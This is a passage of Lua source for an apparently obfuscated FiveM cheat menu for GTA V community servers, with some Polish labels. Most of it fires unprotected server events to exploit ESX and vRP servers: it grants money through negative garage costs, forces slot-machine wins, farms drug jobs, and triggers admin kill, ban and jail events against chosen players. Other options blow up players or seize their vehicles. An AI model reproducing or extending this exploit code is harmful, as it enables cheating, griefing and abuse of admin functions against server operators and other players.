				TriggerServerEvent('paycheck:salary')
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~s~Bank ~r~~h~Deposit") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~s~Bank ~r~~h~Withdraw ") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
				if result then
			...
			fasijotjkurw.fasijotjkurwMenu123Display()
				elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("ESXMisc") then
				    if fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~ESX ~w~Get all licenses Drive") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Send Discord Message") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetfasijotjkurwMenu123DisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
				

				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("MiscServerOptions") then
				if fasijotjkurw.fasijotjkurwMenu123Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Send Police Car Advert") then
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("VRPOptions") then
				if fasijotjkurw.fasijotjkurwMenu123Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Wpisz kwote pieniedzy USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Wpisz kwote pieniedzy USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("ESXDrugs") then
				if fasijotjkurw.fasijotjkurwMenu123Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~g~Money Wash ~c~(x10)") then
					...
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~~h~Stop all ~c~(Drugs)") then
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("~h~~r~-»  ~s~"..GetPlayerName(i).."", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
				
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("RecrutarPlayersOptions") then
				fasijotjkurw.fasijotjkurwMenu123SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
			    if fasijotjkurw.fasijotjkurwMenu123Button("~s~Recruit~c~~h~ Mechanic") then
			...
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~s~Recruit~b~~h~ Police") then
			...
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~s~Recruit~c~~h~ Mafia") then
			...
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~s~Recruit~p~~h~ Gang") then
			...
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~s~Recruit~r~~h~ Inem") then
			...
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Custom Recruit") then
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("~w~Gracz ~w~"..GetPlayerName(i).." "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~w~[~r~NIE ZYJE~w~]" or "~w~[~g~ZYJE~w~]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("PlayerOptionsMenu") then
				fasijotjkurw.fasijotjkurwMenu123SetSubTitle("PlayerOptionsMenu", "~h~Player ~s~~r~[" .. GetPlayerName(SelectedPlayer) .. "~r~]")
				if fasijotjkurw.fasijotjkurwMenu123Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)	
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~Give ~s~Money") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~Remove ~s~Money") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~Explode") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif fasijotjkurw.fasijotjkurwMenu123Button("Give ~b~Armour ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif fasijotjkurw.fasijotjkurwMenu123Button('Fire') then
				    FirePlayer(SelectedPlayer)
					elseif fasijotjkurw.fasijotjkurwMenu123Button("Jail") then		
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("Unjail") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("Weapon Menu", "SingleWepPlayer") then
				elseif fasijotjkurw.fasijotjkurwMenu123Button("Spawn Vehicle") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("Cuff ~g~ESX") then
					TriggerServerEvent("esx_policejob:handcuff", GetPlayerPed(SelectedPlayer))
					elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~b~--Vehicle Options--") then
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~b~Kick Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~b~Fuck Engine ~r~NEW") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~b~Napraw Pojazd ~r~NOWE") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~b~Rozjeb Samochod ~r~NOWE ") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~MelloTrainer ~s~KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~MelloTrainer ~s~BAN") then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~MelloTrainer ~s~KICK") then
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("SingleWepPlayer") then
				for i = 1, #allWeapons do
					if fasijotjkurw.fasijotjkurwMenu123Button(allWeapons[i]) then
			...
			elseif IsDisabledControlPressed(0, 313) then
				fasijotjkurw.OpenMenu("MainMenu")
			end
